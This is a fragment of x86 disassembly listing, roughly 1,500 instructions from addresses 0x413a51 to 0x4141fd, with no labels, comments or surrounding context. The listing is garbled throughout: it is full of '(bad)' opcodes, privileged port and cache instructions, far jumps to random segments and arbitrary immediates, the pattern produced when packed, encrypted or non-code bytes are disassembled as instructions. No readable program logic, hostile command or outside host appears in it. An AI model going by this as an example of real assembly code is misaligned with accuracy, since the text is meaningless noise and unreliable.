  413a51:	lds    edi,FWORD PTR [ebx-0x7f]
  413a54:	aas    
  413a55:	lods   al,BYTE PTR ds:[esi]
  413a56:	popa   
  413a57:	pop    esp
  413a58:	cdq    
  413a59:	mov    dh,0x5a
  413a5b:	inc    ebp
  413a5c:	outs   dx,DWORD PTR ds:[esi]
  413a5d:	add    edi,DWORD PTR [bp+0xea2]
  413a62:	xor    edi,0xffffffc5
  413a65:	std    
  413a66:	mov    BYTE PTR [esi+0x63],dl
  413a69:	sub    eax,0xa1e5dd96
  413a6e:	pop    ebp
  413a6f:	mov    esp,0x56e602
  413a74:	pop    edx
  413a75:	pop    esp
  413a76:	cld    
  413a77:	sub    DWORD PTR [ebx+eiz*4],0x31
  413a7b:	sar    edx,cl
  413a7d:	test   DWORD PTR [ebp+0x6d2ab8c4],eax
  413a83:	pop    ds
  413a84:	cmp    eax,0xb431809f
  413a89:	push   ebp
  413a8a:	fs push ebp
  413a8c:	sub    al,ch
  413a8e:	mov    al,0x3
  413a90:	ds jb  0x413a5f
  413a93:	jmp    0x7777:0xed687c6e
  413a9a:	icebp  
  413a9b:	push   cs
  413a9c:	sbb    eax,0x6f048c64
  413aa1:	adc    BYTE PTR [eax-0x16],0x1c
  413aa5:	enter  0xe14,0x3
  413aa9:	push   ebp
  413aaa:	push   ebx
  413aab:	sahf   
  413aac:	adc    al,0xa4
  413aae:	pop    es
  413aaf:	or     ebp,DWORD PTR [ebx]
  413ab1:	aas    
  413ab2:	jle    0x413a48
  413ab4:	mov    bl,0xa1
  413ab6:	out    dx,al
  413ab7:	js     0x413a5d
  413ab9:	add    eax,0x5f725a6
  413abe:	xchg   edi,eax
  413abf:	gs daa 
  413ac1:	repz sub ecx,DWORD PTR [edi]
  413ac4:	das    
  413ac5:	add    dl,BYTE PTR [ebx+0xa]
  413ac8:	repnz dec ebp
  413aca:	push   edx
  413acb:	push   edx
  413acc:	iret   
  413acd:	push   esp
  413ace:	xor    dl,bl
  413ad0:	xchg   DWORD PTR [esi],ecx
  413ad2:	nop
  413ad3:	sbb    eax,0xa3d92963
  413ad8:	fist   WORD PTR [ebx-0x396481b0]
  413ade:	add    edx,ecx
  413ae0:	inc    esi
  413ae1:	adc    esi,edx
  413ae3:	aam    0x2c
  413ae5:	push   edx
  413ae6:	inc    ebp
  413ae7:	mov    ecx,0x57850758
  413aec:	imul   DWORD PTR [ecx+0x59]
  413aef:	(bad)  
  413af0:	mov    ah,0xd7
  413af2:	xchg   ebx,eax
  413af3:	xchg   ebx,eax
  413af4:	dec    esi
  413af5:	xchg   esi,eax
  413af6:	add    ebp,DWORD PTR [eax+0x24da85c5]
  413afc:	sub    ebp,ebp
  413afe:	xor    al,0x3c
  413b00:	js     0x413b32
  413b02:	test   al,0x26
  413b04:	ficomp WORD PTR [edx-0x3d]
  413b07:	pop    ss
  413b08:	aas    
  413b09:	aam    0x7c
  413b0b:	in     eax,dx
  413b0c:	pop    eax
  413b0d:	sti    
  413b0e:	fdiv   QWORD PTR [esi+edi*2]
  413b11:	mov    bl,BYTE PTR [edi]
  413b13:	dec    eax
  413b14:	pop    esp
  413b15:	inc    esi
  413b16:	popf   
  413b17:	test   DWORD PTR [eax],esi
  413b19:	ror    DWORD PTR [esi],1
  413b1b:	mov    ebp,0x2488e815
  413b20:	cmp    BYTE PTR [ebx+0x578b08ec],dl
  413b26:	jbe    0x413b52
  413b28:	inc    DWORD PTR [ecx+esi*2+0x6affa255]
  413b2f:	ss pushf 
  413b31:	loop   0x413b7e
  413b33:	test   eax,0xf021569d
  413b38:	xchg   BYTE PTR [ebx],dh
  413b3a:	inc    ebp
  413b3b:	push   eax
  413b3c:	lods   al,BYTE PTR ds:[esi]
  413b3d:	pop    ds
  413b3e:	cmp    al,0x6
  413b40:	xchg   esp,eax
  413b41:	dec    ebx
  413b42:	fisttp WORD PTR [edx]
  413b44:	xchg   edx,eax
  413b45:	inc    ebp
  413b46:	out    0xcd,eax
  413b48:	jb     0x413b59
  413b4a:	mov    ds:0x2f7b0b13,al
  413b4f:	cmp    eax,0xf63fe11a
  413b54:	sbb    dl,cl
  413b56:	(bad)  
  413b57:	adc    ah,al
  413b59:	mov    edx,0x492f040e
  413b5e:	ja     0x413b57
  413b60:	jle    0x413ae6
  413b62:	sahf   
  413b63:	push   ebx
  413b64:	xchg   esi,eax
  413b65:	rol    esi,1
  413b67:	lahf   
  413b68:	xor    eax,0xa233819
  413b6d:	jmp    0x775a:0xc4c04a3f
  413b74:	mov    bh,0x57
  413b76:	sbb    ecx,DWORD PTR [ebx+0x24]
  413b79:	sub    edi,edi
  413b7b:	pop    ss
  413b7c:	loope  0x413b04
  413b7e:	pop    edx
  413b7f:	and    al,0x9f
  413b81:	shl    ah,1
  413b83:	pusha  
  413b84:	or     ah,ch
  413b86:	inc    ebx
  413b87:	(bad)  
  413b88:	dec    ebx
  413b89:	ja     0x413b4b
  413b8b:	sbb    bh,BYTE PTR [eax]
  413b8d:	xor    DWORD PTR [edi],ebp
  413b8f:	in     al,0x8e
  413b91:	adc    DWORD PTR cs:[ecx],eax
  413b94:	lds    ebx,FWORD PTR [edi+0x3c]
  413b97:	mov    DWORD PTR [eax-0x24cedeb],ebx
  413b9d:	sbb    BYTE PTR [edi+0x22758a72],dl
  413ba3:	inc    ecx
  413ba4:	add    bl,BYTE PTR [ebp+0x18]
  413ba7:	xchg   DWORD PTR [ecx-0x10],edx
  413baa:	(bad)  
  413bab:	not    esi
  413bad:	sub    ecx,esi
  413baf:	sub    BYTE PTR [edx-0x7ae3ffdf],ch
  413bb5:	jp     0x413bac
  413bb7:	mov    al,ds:0x9f4d0140
  413bbc:	ret    
  413bbd:	cwde   
  413bbe:	jge    0x413bad
  413bc0:	enter  0xf037,0xd6
  413bc4:	pop    ebx
  413bc5:	push   cs
  413bc6:	scas   eax,DWORD PTR es:[edi]
  413bc7:	push   cs
  413bc8:	jg     0x413b8c
  413bca:	sub    eax,0x759b6594
  413bcf:	call   0x6102:0xa8ec12fe
  413bd6:	inc    di
  413bd8:	cmc    
  413bd9:	mov    al,0x8
  413bdb:	xor    DWORD PTR [ecx-0x3b],0x23d971b3
  413be2:	clc    
  413be3:	lds    edx,FWORD PTR gs:[edi-0x38d72e2c]
  413bea:	push   DWORD PTR [ebx+0x78]
  413bed:	jmp    0xbf07a919
  413bf2:	fstp   TBYTE PTR [eax-0x38]
  413bf5:	pop    esp
  413bf6:	xor    ah,BYTE PTR [eax-0x4d345980]
  413bfc:	mov    ss,WORD PTR [esi-0x68af598f]
  413c02:	(bad)
  413c06:	shr    dh,0x1c
  413c09:	inc    ecx
  413c0a:	imul   ecx,eax,0xffffffd4
  413c0d:	wbinvd 
  413c0f:	inc    esi
  413c10:	int    0x63
  413c12:	jle    0x413bec
  413c14:	test   al,0x24
  413c16:	rcl    ebp,0x49
  413c19:	popa   
  413c1a:	add    ebp,DWORD PTR [esi+0x33]
  413c1d:	imul   ecx,esi,0xf2ff5634
  413c23:	fisub  WORD PTR [edi+0x79]
  413c26:	jp     0x413c81
  413c28:	cmp    DWORD PTR [ebx-0x28ed15ad],esi
  413c2e:	cmc    
  413c2f:	push   eax
  413c30:	dec    ecx
  413c31:	out    0x33,eax
  413c33:	inc    esp
  413c34:	inc    edi
  413c35:	test   DWORD PTR [ebp+esi*1-0x7c],esi
  413c39:	pop    edi
  413c3a:	fcomp  QWORD PTR [edx]
  413c3c:	sar    BYTE PTR [edi-0x5f9c7d2b],cl
  413c42:	repnz stc 
  413c44:	ds aam 0x59
  413c47:	popa   
  413c48:	clc    
  413c49:	pop    eax
  413c4a:	xchg   edx,eax
  413c4b:	adc    al,0x40
  413c4d:	and    BYTE PTR [edx],ah
  413c4f:	test   eax,0x6832cbb4
  413c54:	add    DWORD PTR [ecx],edi
  413c56:	sbb    esp,DWORD PTR [edi-0x3be362c9]
  413c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c5d:	les    edi,FWORD PTR [ebp+0x57b6e4d9]
  413c63:	mov    ds:0xf14f44c2,eax
  413c68:	adc    eax,0x326849a5
  413c6d:	in     al,0xf4
  413c6f:	fdiv   QWORD PTR [ecx]
  413c71:	(bad)  
  413c72:	rcl    BYTE PTR [edx+ebx*1+0x36],1
  413c76:	xchg   edi,eax
  413c77:	in     eax,dx
  413c78:	cmp    dh,BYTE PTR [edx-0x2a]
  413c7b:	inc    esp
  413c7c:	jle    0x413cc5
  413c7e:	fdiv   QWORD PTR [esi-0x71]
  413c81:	pop    ds
  413c82:	ret    0x5303
  413c85:	retf   0xc29
  413c88:	dec    esi
  413c89:	test   al,0xbf
  413c8b:	or     BYTE PTR [edx+0x1b],ch
  413c8e:	mov    es,WORD PTR [ebx+0x7371fa4b]
  413c94:	fild   QWORD PTR [edx]
  413c96:	loop   0x413c1d
  413c98:	retf   0x8fd2
  413c9b:	es loope 0x413c88
  413c9e:	jns    0x413c57
  413ca0:	push   0x7
  413ca2:	mov    dl,0xd8
  413ca4:	ins    BYTE PTR es:[edi],dx
  413ca5:	mov    eax,0xb77471d6
  413caa:	data16 fwait
  413cac:	dec    esp
  413cad:	or     al,0x2b
  413caf:	mov    eax,0x7db11d0
  413cb4:	sahf   
  413cb5:	into   
  413cb6:	test   cl,bl
  413cb8:	sub    DWORD PTR [eax+0x447e3f53],ebp
  413cbe:	mov    esp,0x53eebde6
  413cc3:	cmp    edx,DWORD PTR [edi+edx*4-0xed88c1f]
  413cca:	sbb    BYTE PTR [eax-0x5c3ce26],bh
  413cd0:	xchg   esi,eax
  413cd1:	jmp    0x2de5e39a
  413cd6:	scas   al,BYTE PTR es:[edi]
  413cd7:	repnz sbb BYTE PTR [edi+0x2a153c60],0x95
  413cdf:	(bad)  
  413ce0:	jns    0x413d18
  413ce2:	mov    es,WORD PTR es:[edx]
  413ce5:	sar    DWORD PTR [edx+0x14],0x35
  413ce9:	gs pop edx
  413ceb:	aas    
  413cec:	int3   
  413ced:	unpcklps xmm3,XMMWORD PTR [edx]
  413cf0:	push   edi
  413cf1:	enter  0x4b4f,0xfe
  413cf5:	inc    esp
  413cf6:	ja     0x413d53
  413cf8:	adc    edx,DWORD PTR [edx]
  413cfa:	jmp    0xa8a6:0x886ce
  413d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d02:	sub    ecx,esp
  413d04:	icebp  
  413d05:	push   ebx
  413d06:	sbb    cl,dh
  413d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d09:	push   ecx
  413d0a:	fild   DWORD PTR [eax-0x28]
  413d0d:	adc    al,0xc5
  413d0f:	adc    BYTE PTR ds:0x8299aa1c,ch
  413d15:	xor    edx,DWORD PTR [ebp+0x62]
  413d18:	xchg   edi,ecx
  413d1a:	add    ch,bl
  413d1c:	jmp    0xb192:0xd1589b22
  413d23:	mov    DWORD PTR [esi+0x61],esp
  413d26:	clc    
  413d27:	mov    ebx,0x6a9fddfe
  413d2c:	xor    eax,0xcea7ab49
  413d31:	adc    dl,0x43
  413d34:	cmp    al,0xc6
  413d36:	loopne 0x413d5c
  413d38:	dec    esp
  413d39:	mov    bh,0x58
  413d3b:	(bad)  [ecx-0x4c6d1516]
  413d41:	aad    0xf3
  413d43:	iret   
  413d44:	clc    
  413d45:	pop    ebp
  413d46:	xchg   ecx,eax
  413d47:	and    cl,BYTE PTR [eax+0x52]
  413d4a:	mov    eax,0x3c15a4be
  413d4f:	lds    esp,FWORD PTR cs:[edi-0x51]
  413d53:	in     eax,0xe6
  413d55:	pop    eax
  413d56:	scas   eax,DWORD PTR es:[edi]
  413d57:	fcom   QWORD PTR [eax+eax*8+0x44]
  413d5b:	popf   
  413d5c:	bound  edx,QWORD PTR [ecx+0x54]
  413d5f:	pop    edx
  413d60:	sahf   
  413d61:	jmp    FWORD PTR [esp+edi*4+0xd62fc94]
  413d68:	mov    BYTE PTR [ebp+0x690df95e],bl
  413d6e:	outs   dx,BYTE PTR ds:[esi]
  413d6f:	fwait
  413d70:	inc    ebp
  413d71:	mov    DWORD PTR [ecx-0x6],eax
  413d74:	das    
  413d75:	ds icebp 
  413d77:	ret    0x615a
  413d7a:	and    BYTE PTR [ebp+0x4b437fba],bh
  413d80:	test   BYTE PTR [ecx-0x10],0xa2
  413d84:	xor    eax,0xddfe6a09
  413d89:	repz sub cl,BYTE PTR [ebp+0x50]
  413d8d:	popa   
  413d8e:	cmp    al,0x18
  413d90:	sub    dl,bl
  413d92:	cmp    cl,BYTE PTR [eax+0x5b302649]
  413d98:	dec    ecx
  413d99:	xchg   ecx,eax
  413d9a:	addr16 js 0x413d56
  413d9d:	das    
  413d9e:	outs   dx,BYTE PTR ds:[esi]
  413d9f:	sbb    edi,DWORD PTR [esi-0x5d]
  413da2:	fild   DWORD PTR [ecx+eiz*2]
  413da5:	lea    ecx,[esi+0x49d01296]
  413dab:	ret    
  413dac:	push   cs
  413dad:	stos   DWORD PTR es:[edi],eax
  413dae:	xor    edx,DWORD PTR [bp+di]
  413db1:	sbb    DWORD PTR [eax],edx
  413db3:	pop    es
  413db4:	xchg   ecx,eax
  413db5:	mov    edi,0xa6d83b7e
  413dba:	adc    DWORD PTR [edx+esi*1+0x24],edx
  413dbe:	cmp    BYTE PTR [edx+0x355eae97],dh
  413dc4:	fisubr WORD PTR [esi+ecx*8+0x49]
  413dc8:	pop    ebp
  413dc9:	popf   
  413dca:	std    
  413dcb:	ins    BYTE PTR es:[edi],dx
  413dcc:	popf   
  413dcd:	ret    0xa2c0
  413dd0:	repz xchg ecx,eax
  413dd2:	dec    ebp
  413dd3:	into   
  413dd4:	fstp   DWORD PTR [ecx-0x2a707ed]
  413dda:	loop   0x413df9
  413ddc:	sbb    eax,0xbf11ba8f
  413de1:	mov    ah,0x8d
  413de4:	mov    ds:0xbd5d4504,al
  413de9:	retf   0x3d09
  413dec:	pop    es
  413ded:	in     eax,0x8b
  413def:	pop    edi
  413df0:	(bad)  
  413df2:	inc    ecx
  413df3:	out    0x33,eax
  413df5:	inc    ecx
  413df6:	mov    cl,0x12
  413df8:	(bad)  
  413df9:	or     ebx,DWORD PTR [esi+0x6d9f2373]
  413dff:	jmp    0x413e74
  413e01:	pop    esi
  413e02:	inc    esi
  413e03:	push   cs
  413e04:	add    al,0x92
  413e06:	retf   
  413e07:	jno    0x413dea
  413e09:	sahf   
  413e0a:	ret    
  413e0b:	(bad)  
  413e0c:	pop    ds
  413e0d:	(bad)  
  413e0e:	or     BYTE PTR [ebp+edx*1-0x62],dl
  413e12:	mov    BYTE PTR [edi+ebx*1+0x74d29756],ah
  413e19:	(bad)  
  413e1a:	sti    
  413e1b:	jge    0x413e73
  413e1d:	add    al,0xc
  413e1f:	nop
  413e20:	inc    edx
  413e21:	xor    BYTE PTR [ebx+ebx*4+0xd51f933],ch
  413e28:	idiv   DWORD PTR [ebp-0x7f0af0c6]
  413e2e:	mov    eax,cs
  413e30:	dec    esp
  413e31:	gs rol ebp,1
  413e34:	xchg   edx,eax
  413e35:	sbb    eax,0x5cecea10
  413e3a:	dec    ebp
  413e3b:	pop    edx
  413e3c:	mov    ecx,0xe5063e75
  413e41:	popf   
  413e42:	test   edi,edx
  413e44:	xor    al,0x6
  413e46:	ja     0x413ea9
  413e48:	jl     0x413dff
  413e4a:	push   esi
  413e4b:	fwait
  413e4c:	loopne 0x413e65
  413e4e:	sub    al,bh
  413e50:	add    edi,ebp
  413e52:	arpl   WORD PTR [ebx],si
  413e54:	dec    eax
  413e55:	or     DWORD PTR [ebx-0x7d],eax
  413e58:	mov    ds:0x9c32f893,al
  413e5d:	(bad)  
  413e5e:	xchg   edx,eax
  413e5f:	dec    edi
  413e60:	test   DWORD PTR [edi],eax
  413e62:	cmp    bh,cl
  413e64:	adc    ch,BYTE PTR [ebp+0x5cb1bcbd]
  413e6a:	mov    eax,ds:0x973b3464
  413e6f:	and    BYTE PTR [eax+esi*1-0x5d4a45dd],dl
  413e76:	add    BYTE PTR [esi-0x610a52a],cl
  413e7c:	sub    eax,0x979cfe21
  413e81:	mov    ds:0xf60e8033,al
  413e86:	dec    edi
  413e87:	fldenv [ecx+0x2e]
  413e8a:	adc    ecx,esi
  413e8c:	retf   0x513f
  413e8f:	inc    ebx
  413e90:	adc    esp,DWORD PTR [esi+0x20]
  413e93:	push   ebp
  413e94:	xor    bl,BYTE PTR [eax]
  413e96:	dec    ebp
  413e97:	aad    0x36
  413e99:	pushf  
  413e9a:	xchg   BYTE PTR [esi],al
  413e9c:	xor    DWORD PTR [esi-0x3396d6dd],edi
  413ea2:	pop    ebx
  413ea3:	adc    ah,BYTE PTR [eax+eax*2+0x217780a]
  413eaa:	call   0x532f1954
  413eaf:	sub    dh,ch
  413eb1:	stos   DWORD PTR es:[edi],eax
  413eb2:	mov    bh,0xa8
  413eb4:	or     eax,0x8ae4be06
  413eb9:	xor    dh,0x23
  413ebc:	sub    al,0x75
  413ebe:	fstp   QWORD PTR [edi]
  413ec0:	cmc    
  413ec1:	and    al,dh
  413ec3:	cmc    
  413ec4:	outs   dx,BYTE PTR ds:[esi]
  413ec5:	mov    ds:0x1095669e,eax
  413eca:	clc    
  413ecb:	std    
  413ecc:	fld    QWORD PTR [esi]
  413ece:	cmc    
  413ecf:	jecxz  0x413eb5
  413ed1:	imul   ebp,ebx,0xffffffaf
  413ed4:	inc    esi
  413ed5:	mov    al,ds:0xdeaffb1f
  413eda:	mov    dh,0x96
  413edc:	scas   eax,DWORD PTR es:[edi]
  413edd:	adc    DWORD PTR [eax+0x566b1b5a],esi
  413ee3:	push   es
  413ee4:	mov    ch,0xbc
  413ee6:	or     edi,DWORD PTR [eax+0x3e]
  413ee9:	xor    eax,0x90934f95
  413eee:	dec    esi
  413eef:	(bad)  
  413ef0:	mov    esp,0xc7953cc9
  413ef5:	adc    dh,dh
  413ef7:	xor    eax,0x11462f8f
  413efc:	cs mov cl,0x7e
  413eff:	and    DWORD PTR [esi+0x65f7ea27],ebp
  413f05:	sub    dh,BYTE PTR [ebx+0x712c2487]
  413f0b:	mov    al,ds:0xaa0f16db
  413f10:	xor    al,0x5
  413f12:	sub    ah,BYTE PTR [edi+0x13049f9c]
  413f18:	daa    
  413f19:	(bad)  
  413f1a:	fs jae 0x413ea5
  413f1d:	sbb    eax,0xfd356816
  413f22:	stos   DWORD PTR es:[edi],eax
  413f23:	cmp    BYTE PTR [ebp+0x6f],dl
  413f26:	xchg   esi,eax
  413f27:	(bad)  
  413f28:	hlt    
  413f29:	lahf   
  413f2a:	imul   esp,ecx,0xffffffc4
  413f2d:	adc    eax,0x34015586
  413f32:	mov    ?,eax
  413f34:	inc    ebx
  413f35:	jne    0x413eca
  413f37:	push   ebp
  413f38:	dec    esi
  413f39:	jno    0x413f27
  413f3b:	sahf   
  413f3c:	xchg   ebp,eax
  413f3d:	lods   al,BYTE PTR ds:[esi]
  413f3e:	push   ds
  413f3f:	mov    bl,0xa3
  413f41:	cld    
  413f42:	jo     0x413ee6
  413f44:	hlt    
  413f45:	inc    ebp
  413f46:	into   
  413f47:	ja     0x413f8a
  413f49:	adc    DWORD PTR [ecx+eiz*1+0x5372c962],esi
  413f50:	push   esp
  413f51:	cwde   
  413f52:	in     al,dx
  413f53:	adc    BYTE PTR [eax],bl
  413f55:	mov    bl,0x1d
  413f57:	mov    esp,0x9bbc6be3
  413f5c:	push   ecx
  413f5d:	adc    esp,edx
  413f5f:	shl    DWORD PTR [ebx+0x34],1
  413f62:	xchg   esp,eax
  413f63:	xor    BYTE PTR [edi],ah
  413f65:	jns    0x413ef6
  413f67:	ins    BYTE PTR es:[edi],dx
  413f68:	jge    0x413f01
  413f6a:	in     al,dx
  413f6b:	jp     0x413f9d
  413f6d:	fs push ebp
  413f6f:	(bad)  
  413f70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f71:	aam    0x8c
  413f73:	test   eax,0xe5c0361c
  413f78:	or     dl,dh
  413f7a:	mov    es,WORD PTR [edi+0x16]
  413f7d:	and    eax,0x1f8a3928
  413f82:	cmc    
  413f83:	jle    0x413f8b
  413f85:	pop    ss
  413f86:	mov    edi,0xe153f5e7
  413f8b:	dec    ecx
  413f8c:	jl     0x413f1e
  413f8e:	outs   dx,DWORD PTR ds:[esi]
  413f8f:	cmc    
  413f90:	sahf   
  413f91:	cmp    BYTE PTR [ebx-0x6c],ah
  413f94:	mov    ah,0x8d
  413f96:	pop    ebx
  413f97:	sub    al,0xce
  413f99:	inc    ecx
  413f9a:	sub    BYTE PTR [esi-0x37],cl
  413f9d:	push   ss
  413f9e:	and    al,0xda
  413fa0:	sbb    al,0x8a
  413fa2:	leave  
  413fa3:	mov    edx,0xe5f2bee3
  413fa8:	sti    
  413fa9:	pop    eax
  413faa:	inc    ecx
  413fab:	sub    dh,BYTE PTR [esi]
  413fad:	fld    TBYTE PTR [ebx+eiz*2]
  413fb0:	pop    ss
  413fb1:	sbb    eax,0xb932b800
  413fb6:	ja     0x413f4d
  413fb8:	fwait
  413fb9:	sub    bl,BYTE PTR cs:[edi+0x52539f61]
  413fc0:	mov    cl,0xea
  413fc2:	aad    0x15
  413fc4:	(bad)  
  413fc5:	in     al,0xb0
  413fc7:	push   0x6f
  413fc9:	fidivr WORD PTR [eax]
  413fcb:	jge    0x413f98
  413fcd:	pop    es
  413fce:	pop    ebx
  413fcf:	dec    edx
  413fd0:	(bad)  
  413fd1:	jecxz  0x41401b
  413fd3:	rcr    DWORD PTR [ecx],1
  413fd5:	push   eax
  413fd6:	shl    DWORD PTR [edx+0x1d],1
  413fd9:	adc    DWORD PTR [ebx+0x514724c],0xffffff81
  413fe0:	or     al,al
  413fe2:	lea    eax,[edx]
  413fe4:	jne    0x413ffc
  413fe6:	shl    eax,1
  413fe8:	pop    esi
  413fe9:	pop    eax
  413fea:	sub    al,0x0
  413fec:	xlat   BYTE PTR ds:[ebx]
  413fed:	mov    ah,0x12
  413fef:	pop    esi
  413ff0:	repz jbe 0x413f97
  413ff3:	mov    ah,0x94
  413ff5:	xchg   ebp,eax
  413ff6:	xchg   DWORD PTR [edi],esi
  413ff8:	mov    eax,ds:0xda995be7
  413ffd:	mov    eax,ds:0xe2c1b534
  414002:	cmp    eax,0xec9b71b4
  414007:	sub    eax,0x120ea11c
  41400c:	mov    esi,0x364d99
  414011:	ret    0xf5ec
  414014:	sub    ah,al
  414016:	dec    eax
  414017:	jmp    0xfd9f01c3
  41401c:	mov    ebp,0x19c99f32
  414021:	imul   ebp,DWORD PTR [edx-0x49fbf2a8],0xffffff9d
  414028:	xor    ch,al
  41402a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41402b:	xor    ebp,ecx
  41402d:	xchg   edi,eax
  41402e:	cld    
  41402f:	loop   0x413fbc
  414031:	push   ebx
  414032:	xchg   esp,eax
  414033:	xchg   BYTE PTR [edi-0x5e533849],bh
  414039:	fisub  WORD PTR [eax-0x2a]
  41403c:	aam    0x50
  41403e:	fistp  QWORD PTR [edx]
  414040:	repz jno 0x41406d
  414043:	jmp    0x1d87:0xc9252271
  41404a:	mov    eax,0x3a629a75
  41404f:	mov    ds:0xda42ab08,al
  414054:	fistp  QWORD PTR [ebp+0x34ef94f6]
  41405a:	out    0x16,al
  41405c:	in     al,0xe
  41405e:	adc    edx,0xffffff8b
  414061:	push   ebx
  414062:	outs   dx,DWORD PTR ds:[esi]
  414063:	jle    0x414022
  414065:	test   eax,0x9e60b9ac
  41406a:	push   edi
  41406b:	push   eax
  41406c:	inc    esi
  41406d:	ret    
  41406e:	cwde   
  41406f:	into   
  414070:	pop    ecx
  414071:	add    eax,esi
  414073:	mov    dl,0x3e
  414075:	les    eax,FWORD PTR [edi]
  414077:	ss addr16 into 
  41407a:	jecxz  0x41404e
  41407c:	jbe    0x414082
  41407e:	add    al,0x25
  414080:	call   0xaca12be3
  414085:	adc    DWORD PTR [ebp+eiz*2+0x49],ecx
  414089:	jns    0x4140fb
  41408b:	and    al,0x38
  41408d:	xor    DWORD PTR [ebp+0xdc0e3cf],edx
  414093:	jno    0x41407b
  414095:	rep ins BYTE PTR es:[edi],dx
  414097:	fs js  0x414037
  41409a:	fcmove st,st(7)
  41409c:	(bad)  
  41409d:	cmp    BYTE PTR [ecx-0x32fa8e3c],bl
  4140a3:	cli    
  4140a4:	xchg   DWORD PTR [ebx+0x75],edi
  4140a7:	add    DWORD PTR [esi+ecx*4-0x57],0x4f
  4140ac:	xchg   edi,eax
  4140ad:	jae    0x414122
  4140af:	mov    ch,0x52
  4140b1:	iret   
  4140b2:	sbb    eax,0xa9878f09
  4140b7:	mov    ds:0x153362df,eax
  4140bc:	sbb    DWORD PTR [esi-0x74],esi
  4140bf:	cmp    eax,0x9eaefc93
  4140c4:	es mov esp,0x2311b3be
  4140ca:	fs inc eax
  4140cc:	lods   al,BYTE PTR ds:[esi]
  4140cd:	rol    edx,1
  4140cf:	cmp    ecx,ebx
  4140d1:	imul   edi,DWORD PTR [edi],0x11
  4140d4:	retf   0x9706
  4140d7:	out    dx,eax
  4140d8:	sahf   
  4140d9:	cmp    BYTE PTR [eax+0x5b],al
  4140dc:	hlt    
  4140dd:	mov    WORD PTR [esi-0x43b813a2],ds
  4140e3:	adc    al,0xf2
  4140e5:	std    
  4140e6:	lea    ebp,[ebx]
  4140e8:	retf   0x1e6b
  4140eb:	cmp    BYTE PTR [ebx-0x68d0fb6c],0x72
  4140f2:	pop    ecx
  4140f3:	mov    dl,0x2e
  4140f5:	mov    ds:0x24499963,eax
  4140fa:	dec    ebx
  4140fb:	(bad)  
  4140fc:	cmp    cl,BYTE PTR [edx-0x6147acf]
  414102:	mov    dl,0x40
  414104:	out    dx,eax
  414105:	push   ecx
  414106:	mov    ds:0x466e0474,eax
  41410b:	inc    edi
  41410c:	xchg   DWORD PTR [esi+ebx*4-0x47],edi
  414110:	fcomp  QWORD PTR [esi+ecx*1]
  414113:	push   eax
  414114:	xchg   ecx,eax
  414115:	outs   dx,DWORD PTR ds:[esi]
  414116:	and    al,0xf0
  414118:	mov    esi,es
  41411a:	cmp    eax,0x5ebc9811
  41411f:	loope  0x4140c2
  414121:	mov    al,0x87
  414123:	inc    ebx
  414124:	push   esi
  414125:	jle    0x4140dd
  414127:	jnp    0x41419f
  414129:	out    dx,al
  41412a:	in     al,dx
  41412b:	inc    eax
  41412c:	les    esp,FWORD PTR ds:0xee078925
  414132:	pop    edi
  414133:	fadd   DWORD PTR [esi-0x76acb00d]
  414139:	mov    ebx,DWORD PTR [edi-0x47]
  41413c:	shr    BYTE PTR [ebx+0x12],cl
  41413f:	sbb    BYTE PTR [edx+0x23d8a4cf],bh
  414145:	push   ebp
  414146:	xchg   BYTE PTR [ecx-0x68],cl
  414149:	mov    ebp,0x2237ab48
  41414e:	pop    edi
  41414f:	loope  0x414121
  414151:	(bad)  
  414152:	(bad)  
  414153:	rcr    DWORD PTR [esi+ecx*2-0x4f],cl
  414157:	scas   eax,DWORD PTR es:[edi]
  414158:	retf   
  414159:	xor    dl,ah
  41415b:	shl    DWORD PTR [esi-0x43],0x94
  41415f:	mov    cl,0xdb
  414161:	fisub  WORD PTR [esi]
  414163:	icebp  
  414164:	out    0xa4,eax
  414166:	sbb    eax,DWORD PTR [esi]
  414168:	xchg   DWORD PTR [eax],ebx
  41416a:	push   ecx
  41416b:	les    ebx,FWORD PTR [edx+ebp*1-0x4fa21d25]
  414172:	arpl   cx,bx
  414174:	mov    edx,0xbb88cec4
  414179:	fcmovne st,st(0)
  41417b:	push   ebp
  41417c:	sub    ebx,DWORD PTR [edx+0x73dd078c]
  414182:	out    dx,eax
  414183:	xor    ebp,DWORD PTR [ebp+0x60]
  414186:	xchg   edx,eax
  414187:	or     eax,DWORD PTR [ebp-0x20]
  41418a:	or     eax,0x1d6a78be
  41418f:	xor    BYTE PTR [edi+0x42f26b81],dh
  414195:	test   DWORD PTR [edi+0x225b8c50],ecx
  41419b:	xor    dh,al
  41419d:	mov    ebp,0x9993d67
  4141a2:	xchg   ecx,eax
  4141a3:	sub    eax,DWORD PTR [edx-0x45]
  4141a6:	popa   
  4141a7:	repz retf 
  4141a9:	stc    
  4141aa:	test   eax,0x805b0815
  4141af:	std    
  4141b0:	sbb    ch,bh
  4141b2:	(bad)  
  4141b3:	in     eax,dx
  4141b4:	sbb    eax,0xb05946cd
  4141b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141ba:	fwait
  4141bb:	into   
  4141bc:	out    dx,eax
  4141bd:	inc    esp
  4141be:	sub    edx,DWORD PTR [ebp+0x73]
  4141c1:	adc    cl,BYTE PTR [edi+0x46]
  4141c4:	rol    dh,cl
  4141c6:	mov    eax,ds:0x5e04f14b
  4141cb:	les    edi,FWORD PTR [ebx-0x59e16331]
  4141d1:	aam    0x8c
  4141d3:	ds (bad) 
  4141d6:	daa    
  4141d7:	mov    dh,BYTE PTR [edx+0x60]
  4141da:	push   cs
  4141db:	dec    ebp
  4141dc:	jp     0x41416f
  4141de:	push   eax
  4141df:	outs   dx,DWORD PTR ds:[esi]
  4141e0:	lods   al,BYTE PTR ds:[esi]
  4141e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141e2:	sbb    DWORD PTR [esi-0x73],esi
  4141e5:	aad    0x7c
  4141e7:	adc    ebx,DWORD PTR [edi]
  4141e9:	(bad)  
  4141ea:	mov    ch,0x27
  4141ec:	mov    ah,BYTE PTR [edi]
  4141ee:	sti    
  4141ef:	stos   DWORD PTR es:[edi],eax
  4141f0:	xchg   ecx,eax
  4141f1:	shl    BYTE PTR [ecx+ecx*1-0x3b8a36e3],0x80
  4141f9:	jmp    FWORD PTR [edx+0x47]
  4141fc:	dec    eax
  4141fd:	ins    BYTE PTR es:[edi],dx
